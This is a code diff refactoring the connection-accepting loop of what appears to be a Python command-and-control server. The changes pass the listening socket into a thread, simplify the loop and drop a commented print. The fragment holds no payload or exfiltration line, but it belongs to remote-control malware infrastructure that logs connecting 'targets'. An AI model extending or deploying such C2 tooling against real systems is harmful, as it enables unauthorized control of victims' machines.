@@ -283,16 +283,13 @@ def c2_help_manual():
 
 
 
-def accept_connections():
-    while True:
-        if start_flag == False:
-            break
+def accept_connections(sock):
+    while start_flag:
         sock.settimeout(1)
         try:
             target, ip = sock.accept()
             targets.append(target)
             ips.append(ip)
-            # print(termcolor.colored(str(ip) + ' has connected!', 'green'))
             print(Colour().green(str(ip) + ' has connected!') +
                   '\n[**] Command & Control Center: ', end="")
         except:
@@ -507,7 +504,7 @@ def start_accepting_connections(sock):
     Returns:
         The thread object.
     """
-    t1 = threading.Thread(target=accept_connections)
+    t1 = threading.Thread(target=accept_connections, args=(sock,))
     t1.start()
     return t1
 
